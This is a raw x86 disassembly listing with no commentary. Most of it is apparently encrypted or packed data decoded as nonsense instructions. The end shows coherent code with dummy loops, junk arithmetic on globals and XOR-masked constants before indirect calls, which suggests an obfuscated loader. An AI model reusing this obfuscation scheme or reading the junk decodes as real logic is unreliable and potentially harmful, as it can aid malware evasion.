  402fec:	push   0x1e
  402fee:	fst    st(5)
  402ff0:	es in  al,dx
  402ff2:	sub    BYTE PTR ds:0x4704d2e2,dh
  402ff8:	adc    eax,0x4fa1c43c
  402ffd:	jbe    0x402fbf
  402fff:	inc    esi
  403000:	addr16 inc eax
  403002:	or     BYTE PTR [ebx],bh
  403004:	data16 mov dl,BYTE PTR [esi]
  403007:	mov    esi,edx
  403009:	push   ebx
  40300a:	xor    al,0xdd
  40300c:	push   0x155bafbf
  403011:	xor    eax,0x242b2d63
  403016:	cmp    BYTE PTR [edx],dh
  403018:	xchg   ecx,eax
  403019:	shl    DWORD PTR [ebp-0x20],0xe3
  40301d:	or     DWORD PTR [edx+0x5cd36b1c],eax
  403023:	call   0xa75c:0xbca5bd05
  40302a:	sub    eax,0x91130b68
  40302f:	lds    edx,FWORD PTR [di-0x53]
  403033:	pop    ecx
  403034:	add    cl,BYTE PTR ss:[edx+0x3e]
  403038:	shl    DWORD PTR [eax],0x73
  40303b:	jne    0x403068
  40303d:	out    0x4d,al
  40303f:	data16 cli 
  403041:	push   edi
  403042:	(bad)  
  403043:	mov    dh,0x80
  403045:	in     eax,dx
  403046:	ins    DWORD PTR es:[edi],dx
  403047:	cmp    BYTE PTR [ebp+0x65],bl
  40304a:	jge    0x403047
  40304c:	(bad)  [edi-0x1c]
  40304f:	daa    
  403050:	push   ecx
  403051:	cwde   
  403052:	mov    esi,0x7cb916f
  403057:	or     al,0x85
  403059:	fist   WORD PTR [edx]
  40305b:	xor    DWORD PTR [eax+0x2d60f862],ebx
  403061:	jae    0x403037
  403063:	sar    DWORD PTR [edx+0x38],0x55
  403067:	push   ebx
  403068:	pop    ebx
  403069:	rcl    eax,cl
  40306b:	sbb    eax,0x261a9d3f
  403070:	js     0x40304d
  403072:	nop
  403073:	imul   eax,DWORD PTR [esp+ebp*2],0x764d267a
  40307a:	sub    ecx,ebx
  40307c:	pushf  
  40307d:	mov    ah,0xd6
  40307f:	(bad)  
  403080:	(bad)  
  403081:	mov    ebp,0x2b1c45a8
  403086:	rcl    ecx,0xe4
  403089:	mov    WORD PTR [ebp-0x21],fs
  40308c:	adc    edi,0xc4ab9628
  403092:	dec    edi
  403093:	sbb    esi,esi
  403095:	sahf   
  403096:	adc    BYTE PTR [ebp+0x65],0xca
  40309a:	xchg   ebx,eax
  40309b:	jmp    DWORD PTR [edx-0x4e]
  40309e:	aam    0x4f
  4030a0:	jb     0x403076
  4030a2:	rcl    esi,1
  4030a4:	inc    ecx
  4030a5:	lods   al,BYTE PTR ds:[esi]
  4030a6:	clc    
  4030a7:	xor    BYTE PTR [edx-0x1c295580],cl
  4030ad:	cmc    
  4030ae:	xor    eax,0x859241b4
  4030b3:	fisttp DWORD PTR [edx-0x3033b72e]
  4030b9:	(bad)  
  4030ba:	sub    bl,dh
  4030bc:	lahf   
  4030bd:	jp     0x403101
  4030bf:	pop    ebp
  4030c0:	leave  
  4030c1:	jne    0x40310a
  4030c3:	sub    edi,DWORD PTR [esp+edx*2-0x1f]
  4030c7:	pop    ecx
  4030c8:	imul   DWORD PTR [esi+0x2e]
  4030cb:	adc    ebp,edx
  4030cd:	sti    
  4030ce:	cmp    edi,DWORD PTR [ebx-0x521255ca]
  4030d4:	and    ebp,ecx
  4030d6:	iret   
  4030d7:	test   BYTE PTR [esi-0x1],ch
  4030da:	fbld   TBYTE PTR [edx+0x77e4ff92]
  4030e0:	lods   al,BYTE PTR ds:[esi]
  4030e1:	fldenv [ecx-0x4d55545e]
  4030e7:	xchg   DWORD PTR [ebx],edi
  4030e9:	cmp    eax,0x206daa7b
  4030ee:	cmp    bl,0xe4
  4030f1:	jo     0x403146
  4030f3:	mov    DWORD PTR [ebp+esi*2+0x71],ecx
  4030f7:	fdiv   DWORD PTR [esi+ebx*4]
  4030fa:	scas   eax,DWORD PTR es:[edi]
  4030fb:	and    esi,esp
  4030fd:	push   esp
  4030fe:	mov    edi,es
  403100:	shr    DWORD PTR [edi-0x2b19b5ae],cl
  403106:	pop    edi
  403107:	adc    DWORD PTR [edi+0x58b1ccd2],esi
  40310d:	or     DWORD PTR [ebx],esi
  40310f:	pushf  
  403110:	sbb    BYTE PTR [ecx-0x2386d062],ah
  403116:	(bad)  
  403117:	adc    al,BYTE PTR [ecx+ebx*1+0x4728f69d]
  40311e:	clc    
  40311f:	mov    edx,0xfaa537fc
  403124:	stos   BYTE PTR es:[edi],al
  403125:	retf   
  403126:	sahf   
  403127:	sub    edx,DWORD PTR [ecx-0x13cf3dc]
  40312d:	pop    ss
  40312e:	leave  
  40312f:	and    BYTE PTR [ebx+ebx*4],0x90
  403133:	stos   BYTE PTR es:[edi],al
  403134:	outs   dx,BYTE PTR ds:[esi]
  403135:	mov    esp,0xc3f9e22a
  40313a:	pop    eax
  40313b:	hlt    
  40313c:	cdq    
  40313d:	push   ss
  40313e:	xor    al,0xc
  403140:	add    ebx,esp
  403142:	sub    eax,0xfb32c7fc
  403147:	retf   0xc4b1
  40314a:	inc    DWORD PTR [eax]
  40314c:	adc    al,0x4b
  40314e:	or     DWORD PTR [edi+0x1],0x63a81e43
  403155:	jbe    0x4031a3
  403157:	mov    eax,0x16a29a41
  40315c:	sbb    eax,0xc45bdf6f
  403161:	cmp    eax,0x19e0920d
  403166:	push   eax
  403167:	mov    ecx,0x30910802
  40316c:	dec    esp
  40316d:	mov    ecx,0xc1c38192
  403172:	adc    DWORD PTR ds:[eax],ebp
  403175:	pop    ss
  403176:	ret    0x50db
  403179:	in     al,dx
  40317a:	push   esp
  40317b:	and    DWORD PTR [ebx+0x5a],ebp
  40317e:	ret    0x9814
  403181:	pop    ebx
  403182:	mov    al,ds:0x1efeba09
  403187:	xor    eax,0xe2d69512
  40318c:	sub    al,0xe6
  40318e:	and    DWORD PTR [esi+0x7],esi
  403191:	xlat   BYTE PTR ds:[ebx]
  403192:	(bad)  
  403193:	adc    DWORD PTR [eax+ebp*2-0x69],eax
  403197:	pushf  
  403198:	arpl   bx,cx
  40319a:	das    
  40319b:	sahf   
  40319c:	outs   dx,BYTE PTR ds:[esi]
  40319d:	in     eax,0xcc
  40319f:	dec    ecx
  4031a0:	push   ss
  4031a1:	in     eax,0x4f
  4031a3:	(bad)  
  4031a4:	mov    dh,BYTE PTR [ebx+0x3a]
  4031a7:	mov    esp,0x6192a965
  4031ac:	inc    eax
  4031ad:	pop    ebp
  4031ae:	mov    ds:0xf31639a5,al
  4031b3:	add    al,0x43
  4031b5:	push   edi
  4031b6:	in     al,dx
  4031b7:	popa   
  4031b8:	adc    BYTE PTR [edi],cl
  4031ba:	dec    esp
  4031bb:	xor    al,0x51
  4031bd:	push   esp
  4031be:	out    0x94,al
  4031c0:	leave  
  4031c1:	sub    edx,ebx
  4031c3:	or     al,0x74
  4031c5:	stos   DWORD PTR es:[edi],eax
  4031c6:	pop    ds
  4031c7:	pop    es
  4031c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031c9:	test   BYTE PTR [eax],ch
  4031cb:	fwait
  4031cc:	ins    DWORD PTR es:[edi],dx
  4031cd:	rcr    DWORD PTR [eax+0x6c81bb43],0xa7
  4031d4:	sbb    DWORD PTR [ecx],0x9d8fbed5
  4031da:	int3   
  4031db:	mov    ecx,0x8a2c9e47
  4031e0:	outs   dx,BYTE PTR ds:[esi]
  4031e1:	xchg   esi,eax
  4031e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e3:	das    
  4031e4:	(bad)  
  4031e6:	syscall 
  4031e8:	cwde   
  4031e9:	dec    esi
  4031ea:	ds cmc 
  4031ec:	push   ebp
  4031ed:	fcomp  st(1)
  4031ef:	out    0x15,eax
  4031f1:	jno    0x40317f
  4031f3:	pop    edi
  4031f4:	ins    BYTE PTR es:[edi],dx
  4031f5:	mov    ecx,DWORD PTR [edi+0x60154767]
  4031fb:	in     eax,0x12
  4031fd:	adc    ebp,DWORD PTR [ebx-0x57467104]
  403203:	cmp    al,0x3b
  403205:	out    dx,al
  403206:	sub    eax,0xab5537f0
  40320b:	ss loopne 0x403229
  40320e:	aam    0xd0
  403210:	or     DWORD PTR [esp+edi*4],0xffffffe0
  403214:	out    dx,al
  403215:	scas   al,BYTE PTR es:[edi]
  403216:	and    DWORD PTR [ecx-0x73ff6ac5],edx
  40321c:	push   edx
  40321d:	pop    ebp
  40321e:	fmul   DWORD PTR [esi+0x42]
  403221:	sbb    ecx,esp
  403223:	mov    edi,0xe0c64f10
  403228:	mov    cl,0x6b
  40322a:	popa   
  40322b:	cmp    ebp,DWORD PTR [edi]
  40322d:	pop    esp
  40322e:	jmp    0xdd8b:0xd58434d6
  403235:	nop
  403236:	rol    BYTE PTR ds:0xec638145,cl
  40323c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40323d:	adc    ebp,DWORD PTR [ecx+0x56f4ba68]
  403243:	inc    eax
  403244:	lock stos BYTE PTR es:[edi],al
  403246:	das    
  403247:	pop    ebx
  403248:	stc    
  403249:	or     al,0x73
  40324b:	lock pop edx
  40324d:	stos   BYTE PTR es:[edi],al
  40324e:	mov    bh,0x6e
  403250:	or     eax,0x440d3295
  403255:	push   ss
  403256:	mov    DWORD PTR [ebx-0x78],ebp
  403259:	mov    bh,0xc8
  40325b:	(bad)  
  40325c:	aaa    
  40325d:	nop
  40325e:	(bad)  
  40325f:	out    dx,eax
  403260:	mov    WORD PTR [eax+eiz*1+0x4060e001],gs
  403267:	jg     0x4032b1
  403269:	cdq    
  40326a:	(bad)  
  40326b:	sub    ebx,DWORD PTR [edx]
  40326d:	xlat   BYTE PTR ds:[ebx]
  40326e:	test   BYTE PTR [eax],0xde
  403271:	push   edx
  403272:	sbb    al,0x6a
  403275:	inc    edx
  403276:	inc    ebx
  403277:	test   al,0x50
  403279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40327a:	push   ds
  40327b:	mov    eax,0xec9da940
  403280:	pop    esp
  403281:	cmc    
  403282:	daa    
  403283:	mov    ch,BYTE PTR [ebx-0x4f2965af]
  403289:	in     al,dx
  40328a:	call   DWORD PTR ds:0x54274e33
  403290:	fadd   QWORD PTR [eax]
  403292:	or     al,0xba
  403294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403296:	dec    esp
  403297:	retf   0x5507
  40329a:	xor    ah,BYTE PTR [ecx+0x6a93eb32]
  4032a0:	push   cs
  4032a1:	inc    ecx
  4032a2:	das    
  4032a3:	mov    ebp,0xde6e82a9
  4032a8:	or     ecx,DWORD PTR [esi+0x49e72c1f]
  4032ae:	xchg   BYTE PTR [edx+ebx*1-0x3dfc56c1],cl
  4032b5:	loopne 0x403256
  4032b7:	stos   DWORD PTR es:[edi],eax
  4032b8:	sbb    ebp,DWORD PTR [ebx+ebx*4]
  4032bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032bc:	test   al,0xf3
  4032be:	inc    edx
  4032bf:	add    edi,edx
  4032c1:	sub    BYTE PTR [edi-0x58f62bc4],cl
  4032c7:	xor    DWORD PTR [eax+0x48],ebp
  4032ca:	xchg   esp,eax
  4032cb:	bound  edi,QWORD PTR [eax+0x42]
  4032ce:	mov    ds:0x23b64187,al
  4032d3:	aad    0xb
  4032d5:	pop    edi
  4032d6:	jmp    FWORD PTR [esi-0x31f1582a]
  4032dc:	and    bh,bl
  4032de:	in     al,dx
  4032df:	pop    es
  4032e0:	test   al,0x2e
  4032e2:	add    eax,0xb6fec6eb
  4032e7:	int    0xfb
  4032e9:	imul   BYTE PTR [esp+ebp*4]
  4032ec:	push   ebp
  4032ed:	lea    eax,[ebx+0x4]
  4032f0:	xchg   eax,edi
  4032f2:	inc    edi
  4032f3:	jae    0x4032d0
  4032f5:	push   edi
  4032f6:	inc    edi
  4032f7:	adc    cl,BYTE PTR [ecx+0x7de8f50e]
  4032fd:	or     al,0xa5
  4032ff:	in     eax,0xcb
  403301:	js     0x403339
  403303:	mov    bh,BYTE PTR [edx-0x40aa7b5e]
  403309:	fisub  WORD PTR [edi+0x55cd2fff]
  40330f:	inc    ebp
  403310:	lahf   
  403311:	xchg   ebx,eax
  403312:	fsubr  DWORD PTR [esp+eax*2-0x1d6c8a]
  403319:	rcr    dh,cl
  40331b:	out    0xcc,eax
  40331d:	in     eax,0xc9
  40331f:	dec    esi
  403320:	sbb    esp,ecx
  403322:	imul   ebp,DWORD PTR cs:0x8b7686c3,0xc1afbafc
  40332d:	sub    esp,0xfffffff0
  403330:	call   0xd5e30950
  403335:	sub    esp,DWORD PTR [esi-0x15133174]
  40333b:	mov    BYTE PTR [eax+0x63],cl
  40333e:	jmp    0x403335
  403340:	es push ecx
  403342:	xchg   esp,eax
  403343:	(bad)  
  403344:	jb     0x4033af
  403346:	adc    esp,DWORD PTR [esi]
  403348:	(bad)  
  403349:	iret   
  40334a:	lods   al,BYTE PTR ds:[esi]
  40334b:	push   ds
  40334c:	jmp    0x43d0:0xe6df9f90
  403353:	add    ecx,esp
  403355:	push   0x74
  403357:	mov    edx,DWORD PTR ds:0xcbd256c8
  40335d:	mov    ds:0xc1c291ba,al
  403362:	imul   esi,DWORD PTR [eax],0x450c463c
  403368:	dec    edx
  403369:	cdq    
  40336a:	jb     0x4033a1
  40336c:	xlat   BYTE PTR ds:[ebx]
  40336d:	sbb    ecx,DWORD PTR [ecx+0x2575ffdd]
  403373:	xchg   ebx,eax
  403374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403375:	in     al,0xc3
  403377:	mov    ds:0x87c75a89,eax
  40337c:	loopne 0x403366
  40337e:	sbb    ah,BYTE PTR [esi]
  403380:	dec    ebp
  403381:	and    eax,0xd50a44f1
  403386:	xchg   BYTE PTR [edx+0x17683320],dl
  40338c:	inc    esi
  40338d:	imul   ebx,ecx,0xf86848f9
  403393:	leave  
  403394:	cli    
  403395:	add    eax,0x11b51b91
  40339a:	fadd   DWORD PTR [ebp-0xbbe4c8c]
  4033a0:	lds    ebx,FWORD PTR [ebx-0x6591e600]
  4033a6:	cld    
  4033a7:	inc    ebp
  4033a8:	mov    ah,0xe7
  4033aa:	ja     0x403421
  4033ac:	out    0x16,al
  4033ae:	iret   
  4033af:	daa    
  4033b0:	enter  0x1a86,0x89
  4033b4:	leave  
  4033b5:	dec    ecx
  4033b6:	cld    
  4033b7:	and    BYTE PTR ds:0x1627ca7e,bl
  4033bd:	mov    ss,WORD PTR [edi-0x50]
  4033c0:	jecxz  0x40336a
  4033c2:	clc    
  4033c3:	or     esp,DWORD PTR [ebx+0x2c]
  4033c6:	push   edx
  4033c7:	push   es
  4033c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033c9:	inc    BYTE PTR [edi+ebp*8]
  4033cc:	push   ss
  4033cd:	jb     0x403383
  4033cf:	(bad)
  4033d2:	in     eax,0x76
  4033d4:	sbb    bh,BYTE PTR [ebx-0x7458332f]
  4033da:	adc    ah,bl
  4033dc:	push   esp
  4033dd:	pusha  
  4033de:	sti    
  4033df:	add    eax,ebx
  4033e1:	push   ecx
  4033e2:	adc    ebx,edx
  4033e4:	xor    ebx,ecx
  4033e6:	adc    bl,bl
  4033e8:	(bad)  
  4033e9:	out    0x78,eax
  4033eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ec:	sbb    eax,0xb5b2d896
  4033f1:	xchg   esp,eax
  4033f2:	xor    eax,0x744166
  4033f7:	scas   al,BYTE PTR es:[edi]
  4033f8:	and    eax,0x3958e6df
  4033fd:	and    dh,dl
  4033ff:	push   ebp
  403400:	push   ebp
  403401:	mov    esi,0x1f31d28a
  403406:	cld    
  403407:	int3   
  403408:	fnstenv [ecx-0x57acc658]
  40340e:	mov    ecx,0x8842d36f
  403413:	es sti 
  403415:	push   0xffffffee
  403417:	repz mov al,ds:0x99b6e79d
  40341d:	dec    ecx
  40341e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40341f:	stos   DWORD PTR es:[edi],eax
  403420:	or     al,0x19
  403422:	pop    esi
  403423:	add    al,0x85
  403425:	imul   esi,DWORD PTR [eax+0x13],0xef20c357
  40342c:	in     al,dx
  40342d:	and    edx,DWORD PTR [esi-0xf]
  403430:	cli    
  403431:	adc    ecx,esp
  403433:	bound  edx,QWORD PTR [eax+ecx*1]
  403436:	loope  0x4034a0
  403438:	mov    dl,BYTE PTR ds:0xad30f5a9
  40343e:	pop    eax
  40343f:	sbb    cl,BYTE PTR [esi]
  403441:	mov    dl,0xd3
  403443:	mov    bh,0x70
  403445:	(bad)  
  403446:	loop   0x403498
  403448:	(bad)  [ecx+0x28]
  40344b:	inc    esi
  40344c:	jl     0x403437
  40344e:	iret   
  40344f:	mov    al,0xd1
  403451:	test   BYTE PTR [ebx],0xf2
  403454:	pop    es
  403455:	in     al,dx
  403456:	nop
  403457:	in     eax,dx
  403458:	scas   al,BYTE PTR es:[edi]
  403459:	iret   
  40345a:	test   ecx,ebp
  40345c:	sub    ecx,DWORD PTR [edi-0x5de2eeda]
  403462:	push   es
  403463:	cmp    DWORD PTR [eax-0xc],eax
  403466:	jae    0x4034a2
  403468:	mov    eax,0xf6d9817b
  40346d:	mov    BYTE PTR [esi],bh
  40346f:	pop    ss
  403470:	pop    ebp
  403471:	test   al,0x99
  403473:	xchg   ebp,eax
  403474:	pop    es
  403475:	je     0x4034a5
  403477:	mov    ds:0x31841909,eax
  40347c:	push   ds
  40347d:	fiadd  WORD PTR [eax]
  40347f:	inc    eax
  403480:	dec    esi
  403481:	mov    cl,0x67
  403483:	mov    ecx,0x182bf635
  403488:	mov    BYTE PTR [eax+edx*2-0x76],cl
  40348c:	xlat   BYTE PTR ds:[ebx]
  40348d:	retf   
  40348e:	sahf   
  40348f:	xor    bh,al
  403491:	pop    ebp
  403492:	sar    BYTE PTR [eax],1
  403494:	leave  
  403495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403496:	addr16 std 
  403498:	data16 mov bh,0xdb
  40349b:	add    al,0xeb
  40349d:	int3   
  40349e:	dec    ecx
  40349f:	sub    bh,bl
  4034a1:	scas   al,BYTE PTR es:[edi]
  4034a2:	lods   al,BYTE PTR ds:[esi]
  4034a3:	and    ebx,DWORD PTR [edi+0x31f09b3b]
  4034a9:	xchg   DWORD PTR ss:[ecx-0x20],esi
  4034ad:	xchg   esi,eax
  4034ae:	dec    ebp
  4034af:	mov    ah,0x2e
  4034b1:	add    ebp,DWORD PTR [ebp-0x36]
  4034b4:	xchg   edx,eax
  4034b5:	rol    DWORD PTR [esp+esi*1-0x4ba3bd5c],cl
  4034bc:	int    0x84
  4034be:	mov    ds:0x4c43afda,eax
  4034c3:	icebp  
  4034c4:	hlt    
  4034c5:	imul   ah
  4034c7:	(bad)  
  4034c8:	cmc    
  4034c9:	nop
  4034ca:	cwde   
  4034cb:	pop    cx
  4034cd:	jo     0x403549
  4034cf:	repnz out dx,al
  4034d1:	mov    dh,ch
  4034d3:	out    dx,al
  4034d4:	xor    al,0x8e
  4034d6:	sub    BYTE PTR [ebp+0x20266159],ah
  4034dc:	jmp    0xae5b:0xf7104476
  4034e3:	ror    eax,cl
  4034e5:	in     al,dx
  4034e6:	inc    esi
  4034e7:	rcr    DWORD PTR [edx],cl
  4034e9:	and    DWORD PTR [edx],eax
  4034eb:	rcl    BYTE PTR [ebx+0x28b3160b],0xb8
  4034f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034f3:	mov    ah,0x8c
  4034f5:	sbb    bh,al
  4034f7:	lods   eax,DWORD PTR ds:[esi]
  4034f8:	sbb    DWORD PTR [ecx+0x43],ecx
  4034fb:	in     eax,dx
  4034fc:	jnp    0x40348d
  4034fe:	or     ecx,esi
  403500:	mov    DWORD PTR [eax-0x2829df8c],edx
  403506:	xchg   BYTE PTR [edx],cl
  403508:	sub    ebp,DWORD PTR ds:0x49ab2452
  40350e:	ins    BYTE PTR es:[edi],dx
  40350f:	xor    BYTE PTR [esi],dh
  403511:	into   
  403512:	sub    al,0x6b
  403514:	(bad)
  403517:	push   ebx
  403518:	(bad)  
  403519:	xchg   esi,eax
  40351a:	rcr    BYTE PTR ds:0x26d16f7a,cl
  403520:	or     dl,BYTE PTR [ecx]
  403522:	sbb    DWORD PTR [ebx-0x71f52d5f],edx
  403528:	add    eax,0x27db57b6
  40352d:	lds    ecx,FWORD PTR [eax+0xa6a66c3]
  403533:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  403535:	pop    edx
  403536:	xor    eax,0xcc8bcf64
  40353b:	stc    
  40353c:	dec    esi
  40353d:	cmc    
  40353e:	and    dl,cl
  403540:	ja     0x403577
  403542:	les    eax,FWORD PTR [ecx+0x3953ae69]
  403548:	dec    ecx
  403549:	inc    ebx
  40354a:	jl     0x403505
  40354c:	ret    
  40354d:	or     ecx,DWORD PTR [ebx]
  40354f:	push   ebx
  403550:	test   al,0x1d
  403552:	fwait
  403553:	sub    ebp,DWORD PTR [ebx]
  403555:	ret    
  403556:	scas   al,BYTE PTR es:[edi]
  403557:	sub    dl,BYTE PTR [ebx-0x76ec8cc8]
  40355d:	jmp    0xef5:0xf76ba75d
  403564:	mov    bh,0x60
  403566:	cmp    esp,edi
  403568:	xlat   BYTE PTR ds:[ebx]
  403569:	mov    esi,0x410462e5
  40356e:	ret    0x8022
  403571:	push   ds
  403572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403573:	cmp    edi,DWORD PTR [edi+edx*8+0x45]
  403577:	into   
  403578:	(bad)  
  403579:	out    dx,eax
  40357a:	push   ecx
  40357b:	push   eax
  40357c:	mov    edx,0xa59d4bd2
  403581:	int3   
  403582:	nop
  403583:	sbb    al,0x3
  403585:	scas   al,BYTE PTR es:[edi]
  403586:	lock jb 0x40358a
  403589:	xchg   ecx,eax
  40358a:	fnsave [edi]
  40358c:	and    bh,BYTE PTR [ebx]
  40358e:	test   DWORD PTR [ebx-0x4f121f07],0xbe54142
  403598:	mov    BYTE PTR [edx-0x35],al
  40359b:	dec    edi
  40359c:	stc    
  40359d:	popa   
  40359e:	je     0x40352a
  4035a0:	sbb    al,BYTE PTR [eax+0x27]
  4035a3:	fldcw  WORD PTR [esi+0x29c354b9]
  4035a9:	ss je  0x4035b8
  4035ac:	mov    eax,0x2ad24f75
  4035b1:	cmc    
  4035b2:	xor    al,BYTE PTR [esi]
  4035b4:	mov    ebx,0x95518080
  4035b9:	dec    edi
  4035ba:	in     eax,dx
  4035bb:	outs   dx,BYTE PTR ds:[esi]
  4035bc:	cli    
  4035bd:	enter  0xb1fe,0x27
  4035c1:	pop    edx
  4035c2:	es stos BYTE PTR es:[edi],al
  4035c4:	loopne 0x403618
  4035c6:	scas   eax,DWORD PTR es:[edi]
  4035c7:	or     edi,DWORD PTR [edx]
  4035c9:	push   ds
  4035ca:	retf   0x59ab
  4035cd:	mov    ds:0xbd0c691e,al
  4035d2:	and    al,0x17
  4035d4:	pop    ecx
  4035d5:	je     0x403574
  4035d7:	jno    0x40361f
  4035d9:	mov    eax,ds:0x63457e2f
  4035de:	jg     0x4035a3
  4035e0:	popa   
  4035e1:	mov    cl,0x5e
  4035e3:	pushf  
  4035e4:	outs   dx,DWORD PTR ds:[esi]
  4035e5:	xor    al,0xd3
  4035e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035e8:	(bad)  
  4035e9:	xchg   edx,eax
  4035ea:	xchg   ebx,eax
  4035eb:	mov    ah,dh
  4035ed:	xchg   ebx,eax
  4035ee:	inc    esp
  4035ef:	pop    ebp
  4035f0:	cmp    eax,0xd82d5e45
  4035f5:	lods   eax,DWORD PTR ds:[esi]
  4035f6:	mov    edi,0x8997ac49
  4035fb:	(bad)
  4035ff:	ret    0xe97c
  403602:	inc    eax
  403603:	cmp    DWORD PTR [esi+0x44],eax
  403606:	add    eax,DWORD PTR [ebp+0x1b]
  403609:	jge    0x4035a4
  40360b:	xchg   ebx,eax
  40360c:	ds xchg esi,eax
  40360e:	sbb    DWORD PTR [ebp+0x7f],ecx
  403611:	push   0x10
  403613:	cmp    DWORD PTR [edi],esp
  403615:	popf   
  403616:	mov    edi,DWORD PTR [esi]
  403618:	dec    ebx
  403619:	pop    esp
  40361a:	add    ah,BYTE PTR [eax]
  40361c:	pop    edi
  40361d:	(bad)
  403620:	xor    ecx,DWORD PTR [ecx+0x6235c045]
  403626:	add    BYTE PTR cs:[eax],al
  403629:	mov    eax,DWORD PTR [ebp-0x3c]
  40362c:	mov    DWORD PTR [ebp-0x14],eax
  40362f:	and    DWORD PTR ds:0x42a2de,0x0
  403639:	xor    ecx,ecx
  40363b:	xor    ecx,DWORD PTR ds:0x42a2de
  403641:	inc    ecx
  403642:	mov    DWORD PTR ds:0x42a2de,ecx
  403648:	cmp    DWORD PTR ds:0x42a2de,0xb
  40364f:	ja     0x40368d
  403655:	jmp    0x403666
  40365a:	push   DWORD PTR [ebp-0x10]
  40365d:	push   DWORD PTR [ebp-0x18]
  403660:	call   DWORD PTR ds:0x42a3c2
  403666:	cmp    DWORD PTR ds:0x42a2de,0xa
  40366d:	jne    0x403680
  403673:	mov    ecx,DWORD PTR ds:0x42a2de
  403679:	inc    ecx
  40367a:	mov    DWORD PTR ds:0x42a2de,ecx
  403680:	cmp    DWORD PTR ds:0x42a2de,0x12
  403687:	jb     0x403639
  40368d:	mov    eax,DWORD PTR [ebp-0x14]
  403690:	adc    DWORD PTR ds:0x42a2ee,edx
  403696:	push   0x4
  403698:	pop    ecx
  403699:	or     DWORD PTR ds:0x42a256,0x42a2ba
  4036a3:	sub    ecx,eax
  4036a5:	and    DWORD PTR ds:0x42a2ae,edx
  4036ab:	add    ecx,DWORD PTR [ebp-0x1c]
  4036ae:	sub    DWORD PTR ds:0x42a25a,0x29a3
  4036b8:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  4036bf:	adc    DWORD PTR ds:0x42a2ba,0x27f4
  4036c9:	mov    DWORD PTR [ebp-0x18],ecx
  4036cc:	xor    eax,eax
  4036ce:	xor    eax,DWORD PTR ds:0x42a2c2
  4036d4:	or     DWORD PTR ds:0x42a276,eax
  4036da:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  4036e4:	mov    eax,ds:0x42a27e
  4036e9:	or     DWORD PTR ds:0x42a27a,eax
  4036ef:	mov    eax,DWORD PTR [ebp-0x14]
  4036f2:	mov    DWORD PTR [ebp-0x9c],eax
  4036f8:	adc    DWORD PTR ds:0x42a29a,ecx
  4036fe:	mov    eax,DWORD PTR [ebp-0x18]
  403701:	mov    DWORD PTR [ebp-0x98],eax
  403707:	sbb    DWORD PTR ds:0x42a28a,0x5122
  403711:	mov    eax,DWORD PTR [ebp-0x2c]
  403714:	xor    eax,esi
  403716:	add    eax,edi
  403718:	or     DWORD PTR ds:0x42a27a,0x42a2ea
  403722:	mov    DWORD PTR [ebp-0x94],eax
  403728:	lea    eax,[ebp-0x48]
  40372b:	mov    DWORD PTR [ebp-0x90],eax
  403731:	mov    eax,DWORD PTR [ebp-0xa0]
  403737:	xor    eax,esi
  403739:	sbb    DWORD PTR ds:0x42a2f2,0x42a2da
  403743:	add    eax,edi
  403745:	or     DWORD PTR ds:0x42a2ee,0x42a256
  40374f:	mov    DWORD PTR [ebp-0xa0],eax
  403755:	sub    DWORD PTR ds:0x42a272,0x1d49
  40375f:	lea    eax,[ebp-0xa0]
  403765:	push   eax
  403766:	neg    eax
  403768:	mov    eax,DWORD PTR [ebp+0xc]
  40376b:	sub    DWORD PTR ds:0x42a2aa,0x2c11
  403775:	xor    eax,esi
  403777:	add    eax,edi
  403779:	push   eax
  40377a:	mov    eax,ds:0x42943e
  40377f:	push   0x429394
  403784:	mov    DWORD PTR ds:0x42a286,0x524d
  40378e:	push   DWORD PTR [eax]
  403790:	call   0x40a988
  403795:	xor    edx,edx
  403797:	add    edx,DWORD PTR ds:0x42a29e
  40379d:	and    DWORD PTR ds:0x42a28e,edx
  4037a3:	mov    ebx,DWORD PTR [ebp-0x14]
  4037a6:	mov    eax,DWORD PTR [ebp-0x18]
  4037a9:	mov    DWORD PTR [ebp-0x58],eax
  4037ac:	mov    eax,ds:0x42a306
  4037b1:	mov    edx,DWORD PTR ds:0x42a34e
  4037b7:	sub    edx,eax
  4037b9:	sub    eax,DWORD PTR [eax+edx*1]
  4037bc:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  4037c3:	mov    eax,0xf89c85bb
  4037c8:	mov    DWORD PTR [ebp-0x1c],eax
  4037cb:	xor    DWORD PTR ds:0x42a286,0x37ec
  4037d5:	lea    ecx,[eax-0x16]
  4037d8:	and    DWORD PTR ds:0x42a2e2,0x0
  4037e2:	jmp    0x4037f4
  4037e7:	mov    edx,DWORD PTR ds:0x42a2e2
  4037ed:	inc    edx
  4037ee:	mov    DWORD PTR ds:0x42a2e2,edx
  4037f4:	cmp    DWORD PTR ds:0x42a2e2,0x18
  4037fb:	jae    0x40383b
  403801:	cmp    DWORD PTR ds:0x42a2e2,0x4
  403808:	jge    0x40383b
  40380e:	jmp    0x40381c
  403813:	push   DWORD PTR [ebp-0x14]
  403816:	call   DWORD PTR ds:0x42a3c6
  40381c:	cmp    DWORD PTR ds:0x42a2e2,0x3
  403823:	jne    0x403836
  403829:	mov    edx,DWORD PTR ds:0x42a2e2
  40382f:	inc    edx
  403830:	mov    DWORD PTR ds:0x42a2e2,edx
  403836:	jmp    0x4037e7
  40383b:	mov    DWORD PTR [ebp-0x28],ecx
  40383e:	sub    edx,DWORD PTR ds:0x42a2d6
  403844:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  40384b:	mov    edx,DWORD PTR ds:0x42a38a
  403851:	mov    edx,DWORD PTR [edx]
